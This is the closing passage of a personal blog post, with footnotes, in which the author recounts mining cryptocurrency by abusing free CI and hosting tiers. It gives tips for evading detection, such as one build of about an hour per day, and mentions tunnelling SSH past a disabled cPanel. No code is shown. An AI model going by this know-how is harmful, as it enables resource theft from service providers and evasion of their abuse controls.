+<p>I haven&#39;t really delved into obfuscated git commits and obfuscated git repositories. The only instance where I was using a more elaborate repository was with Bitrise since you could not setup a build if the system did not recognize an environment &#40;like mobile apps&#41;, but even then there wasn&#39;t any rotation and it was always the same repository, quite easy to spot.</p>
+<p>Overall, if I had to plot a bell curve around the optimal time to mine <em>without</em> getting accounts banned, across all the tested services, would be with a center around 1 hour build duration, once per day. For cpu cores, apart for a couple out-liars &#40;like drone&#41;, most services expect you use the full amount of resources given to you since builds are run inside VMs or containers with constrained resources...and compilation is usually a task that saturates cpu, so it does not have statistical relevance. Intuitively one build per day is what the average developer would do, so you should expect raised flags if you stray away from the mean, and pushing for abuse never ends well.</p>
+<h2 id=conclusions ><a href="#conclusions" class=header-anchor >Conclusions</a></h2>
+<p>Was it worth it? The networking parts were definitely interesting, dealing with accounts registrations was obviously the worst part, nobodies likes to click endless confirmation emails and repeating mind numbing UI procedures, after all. Writing spam automation software is also boring &#40;because your mostly poking at dumb APIs&#41;, and with this assumption &#40;and the fact that this was never anything serious&#41; I never even considered it. Was it profitable? At its peak it was reaching something like <code>300&#36;</code> per month, maybe enough for a venezuelan, not really for me :&#41;</p>
+<p><table class=fndef  id="fndef:adversary">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:adversary">[1]</a>
+        <td class=fndef-content ><em>the grumpy sysadmin</em>
+    
+</table>
+<table class=fndef  id="fndef:infoproc">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:infoproc">[2]</a>
+        <td class=fndef-content >even though this would break many privacy assumptions, I am sure most of them just peek inside whenever there is a incumbent problem, but this is only a problem for container based runtimes, whereas VMs are pretty much black boxes.
+    
+</table>
+<table class=fndef  id="fndef:monerominer">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:monerominer">[3]</a>
+        <td class=fndef-content >the miner built into the monero node got some work to make it more background friendly, but the distribution of xmrig was never focused on background friendliness.
+    
+</table>
+<table class=fndef  id="fndef:difficulty">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:difficulty">[5]</a>
+        <td class=fndef-content >some pools offer different difficulties on different connection ports, and tend to align the job difficulty to the miner submitted shares, but the granularity of the proxy was still more convenient, as it would prevent pool <a href="https://en.wikipedia.org/wiki/Vendor_lock-in">lock-in</a> &#40;although we never really switched pools &#41;.
+    
+</table>
+<table class=fndef  id="fndef:configwatch">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:configwatch">[4]</a>
+        <td class=fndef-content >it wasn&#39;t happy when the config suddenly appeared and disappeared from the file system
+    
+</table>
+<table class=fndef  id="fndef:stratumprotocol">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:stratumprotocol">[6]</a>
+        <td class=fndef-content >We don&#39;t talk about the <a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol">stratum protocol</a> since we just have to deal with whatever is implemented in <em>both</em> the pool and the miner...which is usually the bare minimum, and possibly with non standard extensions.
+    
+</table>
+<table class=fndef  id="fndef:fullbash">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:fullbash">[7]</a>
+        <td class=fndef-content >never go full bash :&#41;
+    
+</table>
+<table class=fndef  id="fndef:memoryondemand">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:memoryondemand">[8]</a>
+        <td class=fndef-content >I have not explored what happens when a processes loads additional functionality at runtime, as the kernel would look for the address in the memory layout of the executable, which would access the filesystem and possibly causing a crash.
+    
+</table>
+<table class=fndef  id="fndef:freehostinglimits">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:freehostinglimits">[9]</a>
+        <td class=fndef-content >Limits are arbitrary, cpu time is less than a second, memory is less than 128M, outbound connections are blocked.
+    
+</table>
+<table class=fndef  id="fndef:cpanelssh">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:cpanelssh">[10]</a>
+        <td class=fndef-content >with a little bit of patience you can also run a full ssh instance over an environment bootstrapped around your cpanel account space, <em>without</em> having access to the cpanel builtin SSH which tends to be disabled by hosting providers.
+    
+</table>
+<table class=fndef  id="fndef:openshift">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:openshift">[11]</a>
+        <td class=fndef-content >openshift went from a 1 year free tier to 3 months to 1 month, starting to require phone authentication, I can guarantee I was not the only one abusing their services.
+    
+</table>
+<table class=fndef  id="fndef:herokucontainers">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:herokucontainers">[12]</a>
+        <td class=fndef-content >Heroku free tier containers are quite generous in resources, they provide 4c/8t &#40;virtual&#41; cpus, plenty of ram and large storage &#40;which however is not persistent and discarded on dyno shutdown&#41;.
+    
+</table>
+<table class=fndef  id="fndef:saddrone">
+    <tr>
+        <td class=fndef-backref ><a href="#fnref:saddrone">[13]</a>
+        <td class=fndef-content >They adde muc strictier registration rules, after a couple of bans, I might have contributed to it.
+    
+</table>
+  </p>
+<div class=page-foot >
+  <div class=copyright >
+    edited: April 01, 2021
+  </div>
+</div>
+</div><div class=page__footer >
+  <footer>
+    
+    
+    <div class=page__footer-copyright >
+      © untoreh - Powered by <a href=
+      "https://github.com/tlienart/Franklin.jl">Franklin</a>
+    </div>
+    <div class=page__footer-links >
+      -
+      <ul>
+        <li> <a href="/sitemap.xml">Sitemap</a> 
+        |
+        <li> <a href="/tags">Tags</a> 
+        |
+        <li> <a href="/feed.xml">RSS</a> 
+      </ul>
+    </div>
+    <ul class=author__wrap >
+      <li class="author__urls social-icons">
+    <a href="https://twitter.com/untoreh" rel=
+    "nofollow noopener noreferrer"><i class=
+    "fab fa-fw fa-twitter-square" aria-hidden=true ></i></a>
+
+<li class="author__urls social-icons">
+    <a href="https://github.com/untoreh" rel=
+    "nofollow noopener noreferrer"><i class="fab fa-fw fa-github"
+    aria-hidden=true ></i></a>
+
+<li class="author__urls social-icons">
+    <a href="mailto:contact@unto.re"><i class=
+    "fas fa-envelope"></i></a>
+
+<li itemprop=homeLocation  itemscope itemtype=
+"https://schema.org/Place" class="author__place hvr-buzz-out">
+<div class="author__bio .hvr-bubble-float-top" itemprop=description >I am Francesco Giannelli. The website «unto.re» is the place where I put stuff I should remember...or forget.
+Located in south italy. Born in the early nineties.</div>
+    <a rel="nofollow noopener noreferrer" href="https://goo.gl/maps/E3Si7WzG4LX7wpNJ6" target=_blank ><i class=
+    "fas fa-fw fa-map-marker-alt" aria-hidden=true ></i><span itemprop=name >italy</span></a>
+
+
+
+    </ul>
+  </footer>
+</div>
+<script defer src=
+"https://use.fontawesome.com/releases/v5.8.2/js/all.js" integrity=
+"sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH"
+crossorigin=anonymous ></script>   <script src="/libs/highlight/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();hljs.configure({tabReplace: '    '});</script>
+ 
+<script src="/libs/colors.js"></script>
+<script src="/libs/menu.js"></script>
